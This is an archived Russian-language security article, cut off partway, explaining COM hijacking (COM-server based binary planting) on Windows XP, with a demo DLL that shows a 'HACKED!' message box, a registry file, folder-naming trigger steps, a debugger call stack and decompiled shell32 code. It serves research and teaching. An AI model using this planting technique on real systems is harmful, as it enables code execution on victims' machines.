<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en"><head><script type="text/javascript" async="" src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/ga.js"></script><script src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/analytics.js" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app202.us.archive.org';v.server_ms=284;archive_analytics.send_pageview({});});</script>
<script type="text/javascript" src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/bundle-playback.js" charset="utf-8"></script>
<script type="text/javascript" src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/wombat.js" charset="utf-8"></script>
<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden"};</script>
<script type="text/javascript" src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/ruffle.js"></script>
<script type="text/javascript">
    __wm.pc(0.001);
    __wm.init("https://web.archive.org/web");
  __wm.wombat("http://www.nobunkum.ru:80/ru/com-hijacking","20171216115326","https://web.archive.org/","web","https://web-static.archive.org/_static/",
	      "1513425206");
</script>
<link rel="stylesheet" type="text/css" href="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/banner-styles.css">
<link rel="stylesheet" type="text/css" href="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/iconochive.css">
<!-- End Wayback Rewrite JS Include -->

  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>COM Hijacking, или DLL Hijacking come back</title>
  <!-- base href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/" -->
  <link rel="alternate" type="application/rss+xml" title="Журнал NO BUNKUM — Новости" href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/rss">
  <link rel="stylesheet" type="text/css" href="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/style.css">
<!--[if lt IE 8]>
<link rel="stylesheet" type="text/css" href="/template/css/ie.css" />
<![endif]-->
<!--[if IE 6]>
<link rel="stylesheet" type="text/css" href="/template/css/ie6.css" />
<![endif]-->
</head>
<body><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;">
</div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20171216115326/http://www.nobunkum.ru:80/ru/com-hijacking</div>
<script type="text/javascript">//<![CDATA[
__wm.bt(725,27,25,2,"web","http://www.nobunkum.ru/ru/com-hijacking","20171216115326",1996,"https://web-static.archive.org/_static/",["https://web-static.archive.org/_static/css/banner-styles.css?v=S1zqJCYt","https://web-static.archive.org/_static/css/iconochive.css?v=qtvMKcIJ"], false);
  __wm.rw(1);
//]]></script>
<!-- END WAYBACK TOOLBAR INSERT -->
 
      <div class="subscribe">
        
<form action="/web/20171216115326/http://nobunkum.ru/ru/com-hijacking" method="post">
<div>
<input class="mail" type="text" name="email" placeholder="newsletter">
<input type="hidden" name="groups[]" value="1">
<input class="submit" type="submit" value="OK"></div>
</form>
      </div>
  <div id="header">
    <div id="title">
      <a id="logo" href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/"><img src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/logo.jpg" width="374" height="51" alt="NO BUNKUM"></a>
      <p>...on guns, germs, and steel of the digital age</p>
    </div>
    <div id="subtitle">
      <ul><li class="first"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/lookout/" title="Lookout" class="issue">Lookout</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/analytics/" title="Analytics" class="issue">Analytics</a></li>
<li class="current"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/ru/" title="NO BUNKUM" class="issue">NO BUNKUM</a></li>
<li class="last"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/demo/" title="Demo" class="issue">Demo</a></li>
</ul>
      <div class="headerlinks">
        <a id="headerlink-about" href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/about" title="О журнале"><span>?</span></a>
        <a id="headerlink-rss" href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/rss" title="RSS"><span>RSS</span></a>
      </div>
    </div>
  </div>
  <div id="content">
    <div class="aside-long" style="text-align:center;padding:15px 10px">
      <span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=Exploit.SWF.Agent.br">Exploit.SWF.Agent.br</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=Pdfka.asd">Pdfka.asd</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=Pidief.cvl">Pidief.cvl</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=TDSS">TDSS</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=TDSS+removal">TDSS removal</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=binary+planting">binary planting</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=bios+infection">bios infection</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=blind+sqli">blind sqli</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=bootkit">bootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=bootkit+remover">bootkit remover</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=browser+exploitation">browser exploitation</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=com+hijacking">com hijacking</a></span>
<span class="tl-tag tl-tag-weight4"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=disassembling">disassembling</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=dll+hijacking">dll hijacking</a></span>
<span class="tl-tag tl-tag-weight2"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=drive-by+downloads">drive-by downloads</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=hack+online+banks">hack online banks</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=heap-spray">heap-spray</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=hijack+botnet">hijack botnet</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=ibank">ibank</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=kernel+protection">kernel protection</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=kernel-mode+rootkit">kernel-mode rootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=keylogger">keylogger</a></span>
<span class="tl-tag tl-tag-weight5"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=malware+analysis">malware analysis</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=rootkit+detection">rootkit detection</a></span>
<span class="tl-tag tl-tag-weight3"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=trojan">trojan</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/tags?tag=virus+removal">virus removal</a></span>
    </div>
    <div style="margin-top: -10px;">
<h1>COM Hijacking, или DLL Hijacking come back</h1>
<p class="author">Кирилл Солдатов<br><a href="https://web.archive.org/web/20171216115326/mailto:lyr1k.2008@gmail.com">lyr1k.2008@gmail.com</a></p>
<ul class="toc">
<li><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/ru/com-hijacking#link1">Введение</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/ru/com-hijacking#otherlink2">Суть атаки COM-Server Based Binary Planting</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/ru/com-hijacking#otherlink3">Пример проведения атаки</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/ru/com-hijacking#otherlink4">Условия эффективности атаки</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/ru/com-hijacking#otherlink5">Исследование verclsid.exe и её обход</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/ru/com-hijacking#otherlink6">Заключение</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/ru/com-hijacking#otherlink7">Литература</a></li>
<li><a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/ru/com-hijacking#otherlink8">Приложение</a></li>
</ul>
<h2 id="link1">Введение</h2>
<p>Многие слышали про нашумевшие атаки типа DLL Hijacking , однако 
далеко не все знают про одну из разновидностей таких атак — COM 
Hijacking, или COM-Server Based Binary Planting[1]. Что же общего имеют 
эти атаки с DLL Hijacking? Для ответа на этот вопрос нужно рассмотреть 
используемый в Windows механизм OLE\COM.</p>
<div class="aside">
<h4>Статья также доступна на <a href="https://web.archive.org/web/20171216115326/http://nobunkum.ru/analytics/en-com-hijacking">английском</a> языке</h4>
<p><a href="https://web.archive.org/web/20171216115326/http://www.binaryplanting.com/">1. Binary Planting - The Official Web Site</a></p>
</div>
<p>Итак, <strong>COM</strong>, или <strong>Component Object Model</strong>
 (объектная модель компонентов), — это стандарт, разработанный 
Microsoft, который поддерживает межпроцессорное взаимодействие и 
динамическое создание объектов вне зависимости от языка 
программирования. Другими словами, это метод обмена двоичного кода в 
различных приложениях и языках. Это значит, что при условии соблюдения 
стандарта COM-компонент может быть написан на любом языке. На 
сегодняшний момент в мире Windows существует очень много технологий, но 
практически все из них в той или иной мере построены на COM: OLE, 
ActiveX, COM+, DCOM.</p>
<p>Начнем с определений, которые используются в мире COM. <strong><em>Интерфейс</em></strong> (<strong><em>interface</em></strong>) — это просто группа функций. Эти функции называются <strong><em>методами</em></strong> (<strong><em>methods</em></strong>). Как правило, интерфейсам принято давать названия, начинающиеся с буквы I, например <strong>IShellFolder</strong>.
 Интерфейсы могут наследоваться от других интерфейсов. Однако здесь 
наследование работает так же, как и одиночное наследование в C++, т. е. в
 COM-стандарте нет понятия множественного наследования. <strong><em>Объект компонентного класса</em></strong> (<strong><em>coclass</em></strong>
 — component object class) содержится в DLL или в EXE и непосредственно 
включает код одного или нескольких интерфейсов. Говорят, что coclass 
реализует (implement) эти интерфейсы. <strong><em>COM-объект</em></strong> (<strong><em>COM-object</em></strong>) — это экземпляр coclass’а в памяти. <strong><em>COM-сервер</em></strong> (<strong><em>COM-server</em></strong>) — это двоичный файл (COM или EXE), который содержит один или несколько coclass’ов. <strong><em>COM-библиотека</em></strong> (<strong><em>COM-library</em></strong>) — это часть ОС, отвечающая за взаимодействие с приложением. <strong><em>GUID</em></strong> (<strong><em>globally unique identifier</em></strong>) — это 128-битное число, которое позволяет однозначно идентифицировать «объекты» в мире COM:</p>
<ul>
<li>CLSID, class ID — идентификатор coclass’ов;</li>
<li>IID, interface ID — идентификатор интерфейсов.</li>
</ul>
<p>Ну вот, в общем, и закончилось введение в мир COM. Если сейчас вы 
путаетесь в этих определениях, не стоит бояться, так как, когда мы 
перейдем к практике, всё сразу встанет на свои места.</p>
<h2 id="otherlink2">Суть атаки COM-Server Based Binary Planting</h2>
<p><em>Все скриншоты, представленные в этой статье, сделаны на виртуальной машине Windows XP SP3 Rus x86 (все фиксы на 2011-12-14).</em></p>
<p>Многие знают, что в Windows существуют так называемые виртуальные 
папки (virtual folders). К ним относятся «Панель управления», «Мой 
компьютер» и др. В реестре Windows каждой такой папке соответствует свой
 CLSID. Например, «Мой компьютер» имеет CLSID 
«{20D04FE0-3AEA-1069-A2D8-08002B30309D}», «Панель управления» — CLSID 
«{21EC2020-3AEA-1069-A2DD-08002B30309D}». Зная эти CLSID, можно легко 
открывать соответствующие виртуальные папки через Win + R (Пуск -&gt; 
Выполнить). При этом нужно добавить «::» перед CLSID:</p>
<div class="figure"><img src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/image1.png" alt=""></div>
<p>Однако если вы попытаетесь открыть «Панель управления», то ничего не 
выйдет, поскольку она является подпапкой «Мой компьютер». Таким образом,
 чтобы открыть «Панель управления», надо указать полный путь к ней: 
«::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\::{21EC2020-3AEA-1069-
A2DD-08002B30309D}». Но что, если создать папку с именем 
«Test.{20D04FE0-3AEA-1069-A2D8-08002B30309D}»? В результате у нас 
появится папка Test, которая, если смотреть через explorer.exe, будет 
иметь значок «Мой компьютер» (полный путь к папке: С:\Documents and 
Settings\Administrator\Desktop\SomeFolder\Test.{20D04FE0-3AEA-1069-
A2D8-08002B30309D}\):</p>
<div class="figure"><img src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/image2.png" alt=""></div>
<p>Более того, попытавшись перейти в эту папку, мы окажемся в папке «Мой
 компьютер». Отметим, что расширение созданной нами папки (то, что 
отделено от ее имени последней точкой) скрыто от explorer.exe. Давайте 
определим, какая DLL отвечает за обслуживание «Мой компьютер». Для этого
 посмотрим значение по умолчанию в реестре по ключу 
«HKLM\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InProcServer32»:</p>
<div class="figure"><img src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/image3.png" alt=""></div>
<p>Таким образом, за обслуживание «Мой компьютер» отвечает библиотека 
shell32.dll. Следовательно, можно предположить, что при переходе в эту 
папку загружается shell32.dll (но загрузки не происходит, поскольку эта 
библиотека и так всегда загружена). Для проверки этого предположения 
создадим DLL-библиотеку (исходник и бинарник есть в архиве, который 
прилагается к статье):</p>
<pre><code>#define WIN32_LEAN_AND_MEAN
#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt;

#pragma comment(lib, “user32.lib”)

BOOL WINAPI
DllMain( 
    IN HMODULE hModule, 
    IN DWORD   dwReason, 
    IN LPVOID  lpReserved
) 
{     
    switch (dwReason) 
    { 
    case DLL_PROCESS_ATTACH: 
        { 
            TCHAR szModulePath[MAX_PATH], szProcessModulePath[MAX_PATH]; 
            TCHAR szMessage[MAX_PATH]; 
            ZeroMemory(szModulePath, sizeof(szModulePath)); 
            ZeroMemory(szProcessModulePath,  
                sizeof(szProcessModulePath)); 

            GetModuleFileName(hModule, szModulePath, MAX_PATH – 1); 
            GetModuleFileName(GetModuleHandle(NULL),  
                szProcessModulePath, MAX_PATH – 1); 

            _stprintf_s( 
                szMessage,  
                _T(“DLL library \”%s\” injected into the process \”%s\” (PID=%d)”), 
                szModulePath, szProcessModulePath, GetCurrentProcessId() 
                ); 

            MessageBox(0, szMessage, _T(“HACKED!”), MB_ICONERROR);
            break; 
        }

    case DLL_THREAD_ATTACH: 
    case DLL_THREAD_DETACH: 
    case DLL_PROCESS_DETACH: 
        break; 
    } 

    return (FALSE); 
}</code></pre>
<p>Откомпилируем эту библиотеку в FakeSHELL32.dll (cl.exe 
FakeSHELL32.cpp /MT /D “UNICODE” /D “_UNICODE” /LD), поместим в папку 
«C:\1\» и изменим путь в реестре:</p>
<div class="figure"><img src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/image4.png" alt=""></div>
<p>Теперь при переходе в папку «Test.{20D04FE0-3AEA-1069-A2D8-08002B30309D}» мы увидим следующее:</p>
<div class="figure"><img src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/image5.png" alt=""></div>
<p>Таким образом, система действительно загружает COM-сервер, которому 
соответствует CLSID «{20D04FE0-3AEA-1069-A2D8-08002B30309D}» (почему DLL
 внедрилась в verclsid.exe, будет объяснено дальше).</p>
<h2 id="otherlink3">Пример проведения атаки</h2>
<p>Для примера возьмем общедоступный PoC[2]. На сайте написано, что если
 у вас стоит обновление[3] MS11-071, то проэксплуатировать уязвимость не
 получится. Поскольку в нашей тестовой системе это обновление 
установлено, придется вручную создать CLSID и по минимуму его заполнить.
 Для этого создадим и запустим следующий REG-файл (также есть в архиве, 
прилагающемся к статье):</p>
<div class="aside">
<p><a href="https://web.archive.org/web/20171216115326/http://www.binaryplanting.com/demo/XP_2-click/XP_2-click.zip">2. PoC</a></p>
<p><a href="https://web.archive.org/web/20171216115326/http://technet.microsoft.com/en-us/security/bulletin/ms11-071">3. обновление MS11-071</a></p>
</div>
<pre><code>[HKEY_CLASSES_ROOT\CLSID\{42071714-76d4-11d1-8b24-00a0c9068ff3}]

[HKEY_CLASSES_ROOT\CLSID\{42071714-76d4-11d1-8b24-00a0c9068ff3}\InProcServer32]
@="deskpan.dll"
"ThreadingModel"="Apartment"</code></pre>
<p>После внесения всех необходимых изменений создадим папку 
«Files.{42071714-76d4-11d1-8b24-00a0c9068ff3}» (я создал ее на рабочем 
столе). Переименуем нашу DLL-библиотеку в deskpan.dll и переместим ее в 
эту папку. Также создадим в ней пустой RTF-документ (следуя советам из 
«The Anatomy of COM Server-Based Binary Planting Exploits»[4]). При 
попытках открыть этот файл… ничего не происходит. Чтобы выяснить, в чем 
же причина, запустим ProcessMonitor и настроим фильтры. Видно, что, 
когда мы запускаем RTF-файл, система всё же осуществляет поиск DLL, но в
 контексте процесса verclsid.exe (C:\Windows\system32\verclsid.exe):</p>
<div class="aside">
<p><a href="https://web.archive.org/web/20171216115326/http://blog.acrossecurity.com/2011/05/anatomy-of-com-server-based-binary.html">4. The Anatomy of COM Server-Based Binary Planting Exploits</a></p>
</div>
<div class="figure"><img src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/image6.png" alt=""></div>
<p>Переименуем этот файл в verclsid.exe и опять попробуем открыть 
RTF-документ. Ура! Теперь уязвимость срабатывает так, как и написано в 
«The Anatomy of COM Server-Based Binary Planting Exploits».</p>
<div class="figure"><img src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/image7.png" alt=""></div>
<div class="figure"><img src="COM%20Hijacking,%20%D0%B8%D0%BB%D0%B8%20DLL%20Hijacking%20come%20back_files/image8.png" alt="" width="767" height="537"></div>
<p>Что же происходит в недрах ОС? Почему DLL не запускается при наличии verclsid.exe? Давайте попробуем разобраться.</p>
<h2 id="otherlink4">Условия эффективности атаки</h2>
<p>Сначала посмотрим, какие функции вызываются, если в системе нет 
verclsid.exe. Для этого поместим точку останова в DllMain и запустим это
 всё под отладчиком. Итак, стек вызовов для моей тестовой машины 
выглядит следующим образом:</p>
<pre><code>kd&gt; k 40 ChildEBP RetAddr 
0006c4fc 10001027 ntdll!DbgBreakPoint
0006cb24 10001456 deskpan!DllMain+0x27 
0006cb64 100014fe deskpan!__DllMainCRTStartup+0x6c [f:\dd\vctools\crt_bld\self_x86\crt\src\dllcrt0.c @ 330] 
0006cb70 7c90118a deskpan!_DllMainCRTStartup+0x1e [f:\dd\vctools\crt_bld\self_x86\crt\src\dllcrt0.c @ 293] 
0006cb90 7c91b5d2 ntdll!LdrpCallInitRoutine+0x14 
0006cc98 7c9162db ntdll!LdrpRunInitializeRoutines+0x344 
0006cf44 7c91643d ntdll!LdrpLoadDll+0x3e5 
0006d1ec 7c801bbd ntdll!LdrLoadDll+0x230 
0006d254 77511fc5 kernel32!LoadLibraryExW+0x18e 
0006d278 77511ee1 ole32!CClassCache::CDllPathEntry::LoadDll+0x6c 
0006d2a8 77511364 ole32!CClassCache::CDllPathEntry::Create_rl+0x37 
0006d4f4 77511287 ole32!CClassCache::CClassEntry::CreateDllClassEntry_rl+0xd6 
0006d53c 775111e5 ole32!CClassCache::GetClassObjectActivator+0x195 0006d568 
77510d4f ole32!CClassCache::GetClassObject+0x23 0006d5e4 
77510bf3 ole32!CServerContextActivator::CreateInstance+0x106 
0006d624 77510e42 ole32!ActivationPropertiesIn::DelegateCreateInstance+0xf7 
0006d678 77510db9 ole32!CApartmentActivator::CreateInstance+0x110 
0006d698 77511c08 ole32!CProcessActivator::CCICallback+0x6d 
0006d6b8 77511bbf ole32!CProcessActivator::AttemptActivation+0x2c 
0006d6f0 77510ea3 ole32!CProcessActivator::ActivateByContext+0x42 
0006d718 77510bf3 ole32!CProcessActivator::CreateInstance+0x49 0006d758 
77510b8e ole32!ActivationPropertiesIn::DelegateCreateInstance+0xf7 
0006d9a8 77510bf3 ole32!CClientContextActivator::CreateInstance+0x8f 
0006d9e8 77510a38 ole32!ActivationPropertiesIn::DelegateCreateInstance+0xf7 
0006e198 774ff1b3 ole32!ICoCreateInstanceEx+0x3c9 0006e1c0
774ff182 ole32!CComActivator::DoCreateInstance+0x28 0006e1e4 
774ff1f0 ole32!CoCreateInstanceEx+0x1e 0006e214 
77f6947c ole32!CoCreateInstance+0x37 
0006e23c 7c9f1621 SHLWAPI!SHCoCreateInstanceAC+0x3a 
0006e620 7c9f29d8 SHELL32!_SHCoCreateInstance+0x127 
0006e660 7c9f2997 SHELL32!SHExtCoCreateInstance2+0x41 
<strong>0006e680 7ca2faca SHELL32!SHExtCoCreateInstance+0x1e</strong>
<strong>0006e8e0 7c9eda9e SHELL32!CFSFolder::_Bind+0x78</strong> 
0006e908 7c9efb4c SHELL32!CFSFolder::BindToObject+0xa0 
0006e9c4 7c9efb73 SHELL32!CFSFolder::ParseDisplayName+0x1cb 
0006ea98 7c9efb73 SHELL32!CFSFolder::ParseDisplayName+0x1ee 
0006eb88 7c9efb73 SHELL32!CFSFolder::ParseDisplayName+0x1ee 
0006eca8 7c9ee24b SHELL32!CFSFolder::ParseDisplayName+0x1ee 
0006ed18 7c9ee143 SHELL32!CDrivesFolder::ParseDisplayName+0xe8 
0006ed80 7c9ee36e SHELL32!CRegFolder::ParseDisplayName+0x93 
0006eda8 7c9ee30c SHELL32!CDesktopFolder::_ChildParseDisplayName+0x22 
0006edf8 7c9ee143 SHELL32!CDesktopFolder::ParseDisplayName+0x7e 
0006ee60 7c9ee090 SHELL32!CRegFolder::ParseDisplayName+0x93 
0006ee98 7c9ee629 SHELL32!SHParseDisplayName+0xa3 
0006eebc 7c9ee5e3 SHELL32!ILCreateFromPathEx+0x3d 
0006eed8 7c9ee787 SHELL32!SHILCreateFromPath+0x17
0006eef0 7ca34cba SHELL32!ILCreateFromPathW+0x18
0006f370 728442c7 SHELL32!SHGetFileInfoW+0x117
0006f654 728441ad MFC42u!AfxResolveShortcut+0x41 
0006fc9c 728beabe MFC42u!CDocManager::OpenDocumentFile+0x8c 
0006fcc4 01013fc0 MFC42u!CWinApp::ProcessShellCommand+0x10c 
0006ff0c 72841317 WORDPAD!CWordPadApp::InitInstance+0x244 
0006ff1c 0101aa5d MFC42u!AfxWinMain+0x47 
0006ffc0 7c817077 WORDPAD!wWinMainCRTStartup+0x198 
0006fff0 00000000 kernel32!BaseProcessStart+0x23</code></pre>
<p>Видно, что после вызова функции <strong>SHELL32!SHExtCoCreateInstance</strong> всегда происходит загрузка DLL. Таким образом, функцией-триггером является <strong>SHELL32!CFSFolder::_Bind</strong>:</p>
<pre><code>HRESULT __stdcall
CFSFolder___Bind(
IN  const _ITEMIDLIST *pidl, 
IN  IBindCtx *pBindCtx, 
IN  const _GUID *pGUID, 
OUT void **ppv
)
{
  …
  lastItemId = (SHITEMID *)ILFindLastID((LPCITEMIDLIST)pBindCtx);
  if ( CFSFolder___GetBindCLSID(pbc, pidl, lastItemId) )
  {
    hr = SHExtCoCreateInstance(0, (const CLSID *)&amp;guid;, 0, riid, ppv);
    if ( SUCCEEDED(hr) )
    {
        …
    }
    …
  }
  …
}</code></pre>
<p>Как видно из листинга, функция <strong>SHELL32!SHExtCoCreateInstance</strong> вызывается только при успешном вызове функции <strong>SHELL32!CFSFolder___GetBindCLSID</strong>, в которую передается результат работы функции <strong>SHELL32!ILFindLastID</strong>.
 Она, в свою очередь, получает последний элемент пути к объекту (путь к 
любому объекту в SHELL задаётся с помощью структуры ITEMIDLIST, более 
подробно — «The Complete Idiot's Guide to Writing Namespace Extensions -
 Part I»[5]), а функция <strong>SHELL32!CFSFolder___GetBindCLSID</strong> проверяет, является ли этот элемент CLSID’ом. Если это действительно так, то для соответствующего CLSID’а вызывается функция <strong>SHELL32!SHExtCoCreateInstance</strong>. Рассмотрим листинг этой функции:</p>
<div class="aside">
<p><a href="https://web.archive.org/web/20171216115326/http://www.codeproject.com/KB/shell/namespcextguide1.aspx?display=Print">5. The Complete Idiot's Guide to Writing Namespace Extensions - Part I</a></p>
</div>
<pre><code>HRESULT __stdcall 
SHExtCoCreateInstance(
IN  LPCWSTR pszCLSID,
IN  const CLSID *pclsid, 
IN  IUnknown *punkOuter,
IN  const IID *const riid,
OUT void **ppv
)
{
  return SHExtCoCreateInstance2(pszCLSID, pclsid, punkOuter, CLSCTX_INPROC_SERVER|CLSCTX_NO_CODE_DOWNLOAD, riid, ppv);
}</code></pre>
<p>Таким образом, функция <strong>SHELL32!SHExtCoCreateInstance</strong> является «оберткой» вокруг функции <strong>SHELL32!SHExtCoCreateInstance2</strong>:</p>
<pre><code>HRESULT __stdcall
SHExtCoCreateInstance2(
IN  LPCWSTR pszCLSID,
IN  const CLSID *pclsid,
IN  IUnknown *punkOuter,
IN  DWORD dwClsContext,
IN  const IID *const riid,
OUT void **ppv
)
{
  const CLSID *clsid;
  CLSID pClsid;

  clsid = pclsid;
  if ( pszCLSID )
  {
    SHCLSIDFromString(pszCLSID, &amp;pClsid;);
    clsid = &amp;pClsid;
  }
  return _SHCoCreateInstance(clsid, punkOuter, dwClsContext, TRUE, riid, ppv);
}</code></pre>
<p>В свою очередь, функция <strong>SHELL32!SHExtCoCreateInstance2</strong> является «оберткой» вокруг функции <strong>SHELL32!_SHCoCreateInstance</strong>
 и при необходимости преобразует строку CLSID в CLSID. В нашем случае 
это преобразование не выполняется, поскольку первый параметр вызываемой 
функции <strong>SHELL32!SHExtCoCreateInstance2</strong> равен <strong>NULL</strong>. Ключевой кусок функции <strong>SHELL32!_SHCoCreateInstance</strong>:</p>
<pre><code>HRESULT __stdcall
_SHCoCreateInstance( 
IN const CLSID *pclsid, 
IN IUnknown *pUnkOuter, 
IN DWORD dwCoCreateFlags, 
IN BOOL bMustBeApproved, 
IN const IID *const riid, 
OUT void **ppv ) 
{
  HRESULT hRetCode;
  priid = riid;
  …
  if ( bMustBeApproved 
	&amp;&amp; SHStringFromGUIDW(pclsid, &amp;pszClsidValue, 103) 
	&amp;&amp; SHStringFromGUIDW(priid, &amp;pszIidValue, 103) 
	&amp;&amp; !_ShouldLoadShellExt(&amp;pszClsidValue, &amp;pszIidValue, dwCoCreateFlags, pvData) )
	{
		hr = E_ACCESSDENIED; 
	} 
  else
	{
		hRetCode = SHCoCreateInstanceAC(pclsid, pUnkOuter, dwCoCreateFlags, priid, ppv); 
		hr = hRetCode; 
		if ( FAILED(hRetCode) ) 
		{ 
			if ( v10 ) 
			{ 
				if ( v9 ) 
				{ 
					if (hRetCode == REGDB_E_IIDNOTREG || hRetCode == CO_E_FIRST )
						hr = _CreateFromDll(&amp;pvData, pclsid, pUnkOuter, priid, ppv); 
				} 
			}
		}
	…
	}
}</code></pre>
<p>Таким образом, логика работы функции достаточно проста: после 
преобразования CLSID’а и IID’а в строковые значения она вызывает функцию
 <strong>SHELL32!_ShouldLoadShellExt</strong>. В случае, если она возвращает <strong><span style="text-decoration: underline;">ненулевое</span></strong> значение, вызывается функция <strong>SHLWAPI!SHCoCreateInstanceAC</strong>,
 которая, собственно, и загружает необходимую DLL (что и происходит в 
нашем случае: см. стек вызовов). Взглянем на листинг функции <strong>SHELL32!_ShouldLoadShellExt</strong>:</p>
<pre><code>HRESULT __stdcall 
_ShouldLoadShellExt(
IN  LPCWSTR pszCLSID,
IN  LPCWSTR pszIID,
IN  DWORD dwClsContext,
IN  LPCWSTR lpDllName
)
{
  HRESULT result;

  if ( _FindPolicyEntry(
         &amp;g;_hklmBlockedExt,
         &amp;g;_hkcuBlockedExt,
         L"Software\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Blocked",
         pszCLSID)
